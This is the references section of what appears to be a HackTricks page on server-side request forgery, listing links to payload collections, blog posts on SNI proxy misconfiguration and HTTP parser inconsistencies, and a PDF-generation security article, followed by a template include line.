- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
